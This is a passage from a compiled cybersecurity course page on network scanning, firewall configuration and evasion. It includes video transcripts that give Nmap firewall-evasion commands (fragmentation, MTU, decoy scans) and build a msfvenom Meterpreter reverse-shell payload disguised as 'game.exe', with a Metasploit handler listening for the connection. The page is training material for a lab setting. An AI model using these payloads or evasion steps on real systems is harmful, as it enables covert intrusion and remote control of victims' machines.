href="#scanning-considerations"><span>Scanning Considerations</span></a></h4><p>Malicious actors want to be as strategic as possible when selecting scanning tools and methods to use. They must carefully consider the strengths and weaknesses of each scan type. Selecting the wrong method not only takes up valuable time but also increases the chances of detection.</p><p>In addition to the type of scan, a malicious actor considers the time of day that scans are run. Take into consideration that a malicious actor might be counting on:</p><ul><li>A mid-day scan to blend in with legitimate network activity.</li><li>An after-hours scan to go unnoticed.</li></ul><p>A malicious actor approaches each new target based on perceived weaknesses or security flaws. The goal of the malicious actor is to scan undetected. The goal of the security analyst is to detect scans quickly.</p><h4 id="evasion" tabindex="-1"><a class="header-anchor" href="#evasion"><span>Evasion</span></a></h4><p>Hardening techniques will cause a hacker to encounter obstacles when running scans. The obstacles are there to discourage, frustrate, and even detect the hacker. When encountering obstacles, a hacker will typically change tactics. The following table lists some of those tactics.</p>',24),e("table",null,[e("thead",null,[e("tr",null,[e("th",{class_:"firstTableHeader",scope:"col",class:"fw-bold"}," Tactic"),e("th",{scope:"col",class:"fw-bold"}," Description")])]),e("tbody",null,[e("tr",null,[e("td",null,"Scan with ACK"),e("td",null,[t("This type of scan is designed to determine whether the firewall is stateful or stateless. It also identifies the open or closed status of ports. In an ACK scan, only the ACK flag is set. "),e("ul",null,[e("li",null,"If a port is unfiltered, open and closed ports return an RST packet."),e("li",null,"If a port is filtered, it either returns an error message or no response.")])])]),e("tr",null,[e("td",null,"Create fragment packets"),e("td",null,[t("Fragmenting is probably one of the most commonly used methods to avoid detection. The malicious actor continues to send packets; however, the packets are broken apart, so intrusion detection systems do not recognize them as a threat. "),e("br"),e("br"),t(" As long as the fragmented packets are not bombarding the system, the packet segments are undetected.")])]),e("tr",null,[e("td",null,"Spoof IP addresses"),e("td",null,"Many scanning tools can recraft a packet so that the source address reflects a different IP address. The target system is scanned, the feedback is returned to the fake IP address, and there is no record of the hacker's IP address.")]),e("tr",null,[e("td",null,"Use a proxy"),e("td",null,"A proxy serves as a less vulnerable access point to a network. Typically, proxies are placed in networks to keep external users from accessing the internal network. Hackers like proxies because they filter incoming and outgoing traffic. Proxies provide the hacker with anonymity and shield from possible detection.")])])],-1),e("h4",{id:"vulnerability-scans",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#vulnerability-scans"},[e("span",null,"Vulnerability Scans")])],-1),e("p",null,"An organization should perform regular vulnerability scans. Various tools have been designed to scan ports, banners, coding, and other high-target areas for vulnerabilities. Like virus scanners and malware detectors, a vulnerability scan is only as good as its data. If a vulnerability is not included in the current database of issues that are being scanned, an all-clear result could be misleading.",-1),e("p",null,"In addition to keeping scanning tools up to date, use a variety of tools to ensure that you are covering all vulnerabilities. Also, keep in mind that if these tools are available to the organizations you are working for, they are also available to hackers.",-1),e("p",null,"Remind your clients that even if they are not running these scans on a regular basis, someone else may be.",-1),e("p",null,"The following are a few of the vulnerability scanning tools available:",-1),e("table",null,[e("thead",null,[e("tr",null,[e("th",{class_:"firstTableHeader",scope:"col",class:"fw-bold"}," Tool"),e("th",{scope:"col",class:"fw-bold"}," Description")])]),e("tbody",null,[e("tr",null,[e("td",null,"Nessus"),e("td",null,"Nessus is often considered the industry standard for vulnerability scanning. The software helps identify flaws, malware, missing patches, and configuration errors across a network.")]),e("tr",null,[e("td",null,"OpenVAS"),e("td",null,"OpenVAS provides authentication testing, protocol testing, and performance tuning for large-scale networks.")]),e("tr",null,[e("td",null,"Beyond Trust"),e("td",null,"Beyond Trust provides a network security scanner that helps to identify vulnerabilities and prioritize solutions. This software is available as a standalone application or part of a larger vulnerability management solution.")]),e("tr",null,[e("td",null,"InsightVM"),e("td",null,"InsightVM allows you to automate enterprise-level vulnerability management from data collection to risk analysis.")])])],-1),e("h4",{id:"banner-grabbing-prevention",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#banner-grabbing-prevention"},[e("span",null,"Banner Grabbing Prevention")])],-1),e("p",null,"A few banner grabbing prevention options are described in the following table.",-1),e("table",null,[e("thead",null,[e("tr",null,[e("th",{class_:"firstTableHeader",scope:"col",class:"fw-bold"}," Option"),e("th",{scope:"col",class:"fw-bold"}," Description")])]),e("tbody",null,[e("tr",null,[e("td",null,"Disable banners"),e("td",null,"You can disable the banners or at least portions of the banner. Several utilities are available to help change or even remove the banner contents.")]),e("tr",null,[e("td",null,"Hide file extensions"),e("td",null,"File extensions indicate the software that is used to create a web page. Hiding the file extension gives less information to an intruder.")]),e("tr",null,[e("td",null,"Enable custom error pages"),e("td",null,"When you enable custom error pages, you have full control over what a hacker can and cannot see when triggering an error message.")])])],-1),n('<h4 id="performance-considerations" tabindex="-1"><a class="header-anchor" href="#performance-considerations"><span>Performance Considerations</span></a></h4><p>Scanners often cause negative performance impacts on networks and hosts. Scheduled scans performed against well-defined computer groups at different times of the day can mitigate these problems. Additionally, most scanning software has bandwidth throttling options designed to prevent scans from over-utilizing network links.</p><p>When performing vulnerability scans, it is important to consider the following performance considerations:</p><ul><li>Identification of operating system - Identifying the operating system of the target system is essential to ensure that the correct vulnerability scans are applied to the system.</li><li>Scanning interval - Scanning should be done regularly to identify new vulnerabilities.</li><li>Scan speed - The scan speed is important as it can affect the accuracy of the scan results. If the scan is too slow or fast, it may miss important vulnerabilities.</li><li>Vulnerability database - The accuracy of the scan results depends on the quality of the vulnerability database used. It is essential to use a comprehensive and up-to-date vulnerability database.</li><li>Scanning type - Different types of scans can be performed to identify vulnerabilities in the target system. These include port scans, vulnerability scans, and comprehensive security configuration scans. Scan types have a different performance impact on the target system.</li><li>Authentication - Authenticated scans are more comprehensive as they identify vulnerabilities for authentication and therefore have greater access to the host or software. Unauthenticated scans have less performance impact on the target system but will produce limited results.</li><li>False positives - False positives can be generated when performing vulnerability scans. It is important to identify and manage false positives to reduce the time spent researching and validating them and increase the accuracy of the scan results.</li></ul><h4 id="vulnerability-scan-scheduling" tabindex="-1"><a class="header-anchor" href="#vulnerability-scan-scheduling"><span>Vulnerability Scan Scheduling</span></a></h4><p>Scheduling vulnerability scans is essential to maintaining a secure environment and is often required to maintain regulatory compliance. Vulnerability scans help identify system weaknesses that malicious actors may exploit. By scheduling scans regularly, organizations can ensure that any newly discovered vulnerabilities are identified and addressed before they can be exploited. Regular vulnerability scans also help ensure that installed patches are effective and do not introduce new vulnerabilities. Additionally, vulnerability scans help identify misconfigurations and unauthorized changes. Scheduling vulnerability scans is important to ensure an organization&#39;s systems and networks remain secure.</p><h4 id="operations" tabindex="-1"><a class="header-anchor" href="#operations"><span>Operations</span></a></h4><p>Vulnerability scanning can, unfortunately, cause problems such as negatively impacting a system&#39;s performance or causing services to crash. For these reasons, it is important to carefully consider the needs of the organization prior to performing any type of vulnerability scan. It is common for vulnerability scanning activity to follow standard change management procedures to ensure all impacted parties are aware of the scanning activity and the potential for problems.</p><h4 id="intrusion-prevention-system-ips-intrusion-detection-system-ids-and-firewall-settings" tabindex="-1"><a class="header-anchor" href="#intrusion-prevention-system-ips-intrusion-detection-system-ids-and-firewall-settings"><span>Intrusion Prevention System (IPS), Intrusion Detection System (IDS), and Firewall Settings</span></a></h4><p>In addition to host or application credentials, it is essential to ensure that the vulnerability scanners can work with other security systems. An agent-based scanner will need to communicate with the management server through firewalls using appropriate port ranges. Agent-based scans may also be blocked by intrusion detection/prevention systems or anti-malware systems unless reasonable exclusions are configured.</p><p>An agentless scanner may not work through a firewall or network IDS/IPS since these security devices are often designed to prevent such scanning. Scanning through a device like this may overload it and potentially cause the scanner to miss existing vulnerabilities (false negatives). It is also likely to flood the logs in the security appliance. An option to remedy this is to deploy additional scanner nodes within the protected segment and configure them to report results to a management server. Agent-based scans can often attain similar results. It is important to consider that host-based firewalls may cause similar problems.</p><p>The scanner management engine will need access to specific URLs to download updates. Firewall or proxy rules may need to be updated to allow this type of communication.</p><h4 id="data-sensitivity-levels" tabindex="-1"><a class="header-anchor" href="#data-sensitivity-levels"><span>Data Sensitivity Levels</span></a></h4><p>A data inventory, or data map, describes the mechanisms used to identify and track the data assets created, controlled, or maintained by an organization. The data inventory describes the data in terms of what it contains, such as intellectual property; customer data; third-party, confidential business data; and others, as well as its classification and sensitivity. Having a clear view of data is the first step in protecting it. Gaining full visibility is hindered by the complexity and dynamics of how data is stored, as well as obtaining clear information regarding what each piece of identified data represents.</p><h3 id="_5-2-7-configure-a-perimeter-firewall" tabindex="-1"><a class="header-anchor" href="#_5-2-7-configure-a-perimeter-firewall"><span>5.2.7 Configure a Perimeter Firewall</span></a></h3><p>Click one of the buttons to take you to that part of the video.</p><p>Configuring Firewall Rules 00:00-00:37 In this demonstration, we&#39;re going to configure firewall rules on a pfSense security appliance. First, we&#39;re going to configure a firewall rule to allow both HTTP and HTTPS traffic from the internet, or WAN, through the firewall and to our web server on our screened subnet. The second thing we&#39;re going to do is configure a rule to allow all traffic coming from our LAN to get to our screened subnet through the firewall. Be aware that when we are talking about a screened subnet, some vendors may refer to this as a demilitarized zone, or DMZ.</p><p>Allow HTTP and HTTPS 00:37-04:43 I want to verify that I have my screened subnet ready to go. I&#39;ll scroll down, and you can see I have my three interfaces here, and they have assigned IPs.</p><p>Let&#39;s create our rules. I&#39;ll go to Firewall &gt; Rules, and the first rules I&#39;ll configure are the ones from our WAN to our screened subnet to allow HTTP and HTTPS to our web server. I want to go to the DMZ tab here, and down here, I have a few buttons. You&#39;ll notice there are two buttons that say Add. This one has the arrow pointing up, and if I pick that one, it&#39;ll add the rule to the top of my list. If I click on the one with the arrow pointing down, it&#39;ll add the rule to the bottom, so I&#39;ll click on that one.</p><p>For our rule, we want to choose to pass the traffic through the firewall. My other choices are to block it or reject it. If we choose Block, it will just drop the packets as if they never arrived If we choose Reject, the packets are returned to the sender, and the sender can see they were blocked. For security reasons, sometimes you don&#39;t want senders to know that your device is even there, and it&#39;s better to just block the packets. But if you&#39;re troubleshooting issues, reject can be more helpful. Either way, with block or reject, the packets won&#39;t reach the destination.</p><p>The interface that I want to configure is the DMZ. You can see that I have my LAN and WAN here as well. For Address Family, I&#39;ll leave it as IPv4. The other choices are IPv6 or both. For Protocol, we&#39;re allowing HTTP, which runs on TCP. If I click the dropdown list, you can see all the other protocols that we could choose if we were going to allow some other type of traffic.</p><p>Our source is going to be from our WAN network. I need to see more options, so I&#39;ll click on the Display Advanced button. The Source Port Range is going to be HTTP. I could put in a single port or a range, but we just want HTTP port 80. Since this is going to be my web server, I need to put in the IP address here. First, I&#39;ll pick Single host or alias, and now let&#39;s pop our diagram back up. Our web server&#39;s IP is right here, so let&#39;s go back and enter that in. Destination Address will be &#39;172.16.1.5&#39;. We&#39;re using HTTP, and the rest of this looks good.</p><p>Down here, we could log packets handled by this rule. Since this is a web server, we probably don&#39;t want to do that since our log would be overwhelmed. If it was FTP, SSH, or other traffic like that, we probably would want to log traffic, but not for normal web requests. We do want to put a description in here because as you create more and more rules, you&#39;ll forget what they all do. For this, I&#39;ll type in &#39;HTTP to DMZ from WAN&#39; and click Save. On our next page here, we have to click on Apply Changes for the changes to my firewall to take effect.</p><p>So, here are my rules so far. I have one that allows my screened subnet out, and this second one is our HTTP rule from the WAN on port 80 the web server on our screened subnet.</p><p>Now, you might be saying to yourself, &quot;Doesn&#39;t most web traffic use HTTPS these days?&quot; Well, that answer is certainly yes, so now we need an HTTPS rule.</p><p>Here&#39;s some good news: to save a bit of time and keep from making any errors, we can just copy this rule and change the HTTP port 80 to HTTPS port 443. I&#39;ll click here, which is the Copy icon. What this does creates a new rule with the exact settings. I&#39;ll scroll down and change my source from HTTP port 80 to HTTPS port 443. For the destination, I&#39;ll do the same. Scroll down change the description by just adding the letter &#39;S&#39;. Click Save. On this page, Click Apply Changes. Down here, you now see our rules for both HTTP and HTTPS.</p><p>Allow LAN Traffic to WAN 04:43-06:28 Now let&#39;s look at our diagram again. This time, I want to create a rule that allows any traffic from my LAN to get to the screened subnet. Let&#39;s go back to our firewall and configure that now. These rules are read from the top down. So, for example, if the first rule says block everything, none of the other rules would ever be seen because that&#39;s the very first rule. However, if we made a rule right now that said to block everything and put it at the bottom, our first three rules would still be fine, but everything else would be blocked. By default, everything is blocked with pfSense anyway unless you open it, so we wouldn&#39;t really need that sort of rule, but it doesn&#39;t hurt anything. So far, our rules don&#39;t affect one another, so it really doesn&#39;t matter where we put them, but keep all of this in mind when creating rules. We&#39;ll just click on Add and use the one that puts it at the bottom of the list.</p><p>Our Action will be to pass traffic. We&#39;ll leave the interface and address family alone. But for protocol, we&#39;re going to change this from TCP to Any. This might not be the best practice, but we&#39;re allowing any and all traffic from our LAN to reach our screened subnet. Under Source, we&#39;ll choose our LAN network from the list. Our destination will be the screened subnet from this list. We don&#39;t want to forget a description for this rule. I&#39;ll type &#39;LAN to DMZ Any&#39;. Click Save. As always, Apply Changes.</p><p>Here&#39;s my latest rule. My source is from the LAN on any port to my DMZ on any port. By the way, the asterisk is wildcard, which means any. Over here, the green check mark means it&#39;s enabled.</p><p>Summary 06:28-06:38 That&#39;s it for this demo. In this demo, we created firewall rules on our firewall.</p><h3 id="_5-2-8-avoid-firewall-detection" tabindex="-1"><a class="header-anchor" href="#_5-2-8-avoid-firewall-detection"><span>5.2.8 Avoid Firewall Detection</span></a></h3><p>Click one of the buttons to take you to that part of the video.</p><p>Nmap Scans to Avoid Firewall Detection 00:00-00:20 Nmap, or Network Mapper, has many different types of scans. One big issue is that many of the scans are stopped by the firewall or the intrusion prevention system, typically just called the IPS. We&#39;re going to look at a few scans&#39; types with Nmap that might help us get past the firewall.</p><p>The TCP SYN Scan 00:20-01:02 The SYN scan is the default and most popular scan option with Nmap. it&#39;s performed quickly, and it&#39;s able to scan thousands of ports per second on a fast network without intrusive firewalls. The SYN scan never completes a TCP connection, so it&#39;s usually stealthy. Let&#39;s look at a SYN scan.</p><p>I&#39;m on my Kali Linux system. I have a terminal open. The first scan we&#39;re going to do is a TCP SYN scan. I&#39;ll go ahead and type in ‘nmap -sS 10.10.10.1&#39; and press Enter. This device is a firewall, and the scan only took a few seconds. You can see I have a few open ports and a few closed ports. There&#39;s nothing too exciting, so let&#39;s move on.</p><p>Fragmentation Scan 01:02-01:41 Some firewalls and IDS devices have trouble dealing with fragmented IP packets, so happens the fragmented packets get passed through the device. Once a hacker finds out that fragmented packets can get past the security, they can use other tools to exploit the victim. A fragmented scan is pretty easy. The command is ‘nmap -f 10.10.10.1&#39; (notice that we&#39;re using a lowercase f). Nmap, like Linux, is case-sensitive, so be aware of that. Okay. The scan is complete. And up here, you see the -f. But I don&#39;t see anything extra in this scan from the last one.</p><p>Specify the Packet Size 01:41-04:55 A user can specify a specific packet size for packets. This is done by setting the Maximum Transmission Unit, or the MTU. For example, if we tell the packet size to be 128, nmap will create 128-byte packets, which will confuse the firewall. The hope is that the firewall won&#39;t know what to do and let us through. And like before, once we know this, we can use other tools to exploit the system. We do that by typing ‘nmap 10.10.10.1 –mtu 128&#39;, and the scan is complete. But I don&#39;t still don&#39;t see anything new.</p><p>Next, we&#39;ll do a decoy scan. With this scan, we can instruct Nmap to spoof IP packets from other hosts, in addition to our IP. In the firewall logs, not only would our IP address be there, but also the IP addresses of the decoys, so it will be much harder to determine from which system the scan started.</p><p>Now, to get a better idea what this looks like, I&#39;m going to open Wireshark. And after our scan, we&#39;ll look and see if the spoofing worked. Sounds fun, right? So, here we go. I&#39;ll come up to Applications, down to Sniffing &amp; Spoofing, and over to Wireshark. I&#39;ll come up here and click the shark fin to start scanning, minimize this, and go back to the terminal.</p><p>Now type in, ‘nmap -D RND:25 10.10.10.1&#39;. Press Enter, and the scan completes. So, up here, we used the -D, which tells Nmap it&#39;s a decoy scan. The RND means random IP address. And the 25 says, &quot;Hey, use 25 IP address.&quot; Now let&#39;s see what happened in Wireshark.</p><p>Okay. I&#39;ll come up here, stop scanning, and scroll up. Here, you can see the Source IP. You have a who bunch of random IP address, and they&#39;re all going to the destination, which is 10.10.10.1. This would hopefully confuse anyone looking at all these IP address. But in this case, you see this one private IP address of 10.10.10.197 among all the public Ips. And if I was looking at this, I&#39;d figure out right away that this person, here, is on my same network, so it would be bad news for them. All right. Let&#39;s close Wireshark now.</p><p>Okay. The last thing we&#39;re going to try is to use the Firewalk script with Nmap. This script is really cool. It tries to figure out the firewall rules by using an IP time to live expiration technique. Basically, the scanner sends a probe located beyond the firewall, one TTL past the gateway. The hope is that the gateway will forward it on. If it is forwarded, then we can expect some sort of results. If it is not, it gets dropped, and we don&#39;t get a response. There&#39;s no guarantee that it will work, but it&#39;s fun to try. So, let&#39;s give it a try. The command is ‘nmap –script=firewalk 10.10.10.1&#39;. Press Enter. And, once again, we&#39;re pretty much getting the same results. So, as a security analyst, I would be able to confirm that this firewall is probably doing its job and keeping unauthorized traffic out.</p><p>Summary 04:55-05:22 That&#39;s it for this demo. In this demo, we discussed some of the ways to use Nmap to bypass a firewall or IPS. First, we used some common Nmap scanning techniques to see if we could get past the firewall. Then we demonstrated how to use a decoy scan to hide our IP among several other IPs. We ended by discussing the term Firewalking and using the Nmap Firewalk script to scan a firewall.</p><h3 id="_5-2-9-bypass-windows-firewall-with-metasploit" tabindex="-1"><a class="header-anchor" href="#_5-2-9-bypass-windows-firewall-with-metasploit"><span>5.2.9 Bypass Windows Firewall with Metasploit</span></a></h3><p>Click one of the buttons to take you to that part of the video.</p><p>Bypass Windows Firewall with Metasploit 00:00-00:17 As hacking attempts increase, developers put up greater and greater defenses to prevent attacks. Windows Firewall is one of these defenses; but it&#39;s not perfect. In this demo, we&#39;re going to look at bypassing the Windows Firewall to create a remote session.</p><p>Turn on Windows Firewall 00:17-00:35 I&#39;m going to start out by verifying that my Windows Firewall is turned on. I&#39;ll come down to my search bar and type in &#39;firewall&#39;. And up here, at the top of the list, we have my Windows Defender Firewall. It looks like the firewall for public networks is turned off, so I&#39;ll turn that back on and close this window. Now I&#39;ll go over to Kali Linux.</p><p>Start a Meterpreter Session 00:35-02:47 Okay. I&#39;m on Kali Linux, and I have a terminal open. Now we have a command to type in. I&#39;ll explain it when I&#39;m done. Let&#39;s type &#39;msfvenom -p windows/meterpreter/reverse_tcp LHOST 10.10.10.197 LPORT 4444 -f exe game.exe&#39; and press Enter.</p><p>MSFvenom is a combination of MSFpayload and MSFencode. These tools are used to generate payloads in various formats and encode them using various encoder modules.</p><p>-p specifies the payload to be used. We&#39;re specifying that we&#39;re doing a reverse TCP connection.</p><p>We have our LHOST IP to receive a back connection. We&#39;ve used this system&#39;s IP.</p><p>-f specifies that the file type is an exe file, and it&#39;s going to be named game.exe.</p><p>Now we need to start Metasploit. We&#39;ll start by getting the database running. Do that by typing &#39;service postgresql start&#39; and press Enter. Now type in &#39;msfconsole&#39; to start Metasploit and press Enter. Metasploit starts up, and I&#39;ll type in &#39;clear&#39; to clean up the screen.</p><p>I&#39;m going go type in &#39;use exploit/multi/handler&#39; and press Enter. A handler is used with Metasploit when you&#39;re executing a back door in a victim&#39;s machine and you need to connect to take control.</p><p>Now we need to set our payload. I&#39;ll type &#39;set payload windows/meterpreter/reverse_tcp&#39; and press Enter.</p><p>I need to set this to my local IP address, so I&#39;ll type &#39;set LHOST 10.10.10.197&#39;. Press Enter.</p><p>Next, let&#39;s set our local port. I&#39;ll do that by typing &#39;set LPORT 4444&#39;. Press Enter.</p><p>Let&#39;s run the exploit. I&#39;ll type in &#39;exploit -j -z&#39; and press Enter. The -j flag tells it to run in the context of a job, and -z tells it not to interact with the session once it becomes active.</p><p>The messages say that we&#39;ve started a reverse TCP handler on my machine, my IP is 10.10.10.197, and it&#39;s on port 4444. So now, we&#39;re listening, waiting for a connection.</p><p>Let&#39;s go over to our Windows 10 system.</p><p>Install the Payload on a Windows 10 System 02:47-03:19 I&#39;m back on my Windows 10 system. There are many ways to get a victim to install a payload. I can email it, have them download it, copy it via a USB, transfer it over the network, and so on. In this scenario, I copied it over the network to a folder called &quot;share&quot;, so I&#39;ll go to my C drive, to the share folder, and here is the game.exe. I&#39;ll double-click on it, and it nothing seems to happen. But, in reality, I just launched this session. A good antivirus would catch this, but my firewall allowed it to go through. Let&#39;s go to the Kali system and check things out over there.</p><p>Confirm the Session 03:19-03:35 I&#39;m back on my Kali system. Here, you can see that we have a Meterpreter session up and running. I can see my host IP, here, and that I&#39;m connected to my victim with the IP of 10.10.10.195.</p><p>At this point, I can do whatever I want from a command line on a Windows system.</p><p>Summary 03:35-03:45 And that&#39;s it for this demo. In this demo, we used Metasploit to bypass a Windows firewall and created a remote session.</p>',64)]))}const u=s(l,[["render",c],["__file","5.2.html.vue"]]),p=JSON.parse('{"path":"/CyberDefensePro/5.2.html","title":"2.1 Regulations and Standards","lang":"zh-CN","frontmatter":{"lang":"zh-CN","title":"2.1 Regulations and Standards","description":"some description"},"headers":[{"level":2,"title":"Section 5.2 Scanning","slug":"section-5-2-scanning","link":"#section-5-2-scanning","children":[{"level":3,"title":"5.2.1 Scanning Overview","slug":"_5-2-1-scanning-overview","link":"#_5-2-1-scanning-overview","children":[]},{"level":3,"title":"5.2.2 Scanning Process Facts","slug":"_5-2-2-scanning-process-facts","link":"#_5-2-2-scanning-process-facts","children":[]}]},{"level":2,"title":"TCP Flags","slug":"tcp-flags","link":"#tcp-flags","children":[{"level":3,"title":"5.2.3 Scanning Tool Facts","slug":"_5-2-3-scanning-tool-facts","link":"#_5-2-3-scanning-tool-facts","children":[]},{"level":3,"title":"5.2.4 Scanning Considerations","slug":"_5-2-4-scanning-considerations","link":"#_5-2-4-scanning-considerations","children":[]},{"level":3,"title":"5.2.5 Scanning Considerations Facts","slug":"_5-2-5-scanning-considerations-facts","link":"#_5-2-5-scanning-considerations-facts","children":[]},{"level":3,"title":"5.2.7 Configure a Perimeter Firewall","slug":"_5-2-7-configure-a-perimeter-firewall","link":"#_5-2-7-configure-a-perimeter-firewall","children":[]},{"level":3,"title":"5.2.8 Avoid Firewall Detection","slug":"_5-2-8-avoid-firewall-detection","link":"#_5-2-8-avoid-firewall-detection","children":[]},{"level":3,"title":"5.2.9 Bypass Windows Firewall with Metasploit","slug":"_5-2-9-bypass-windows-firewall-with-metasploit","link":"#_5-2-9-bypass-windows-firewall-with-metasploit","children":[]}]}],"git":{"updatedTime":1746570796000},"filePathRelative":"CyberDefensePro/5.2.md"}');export{u as comp,p as data};
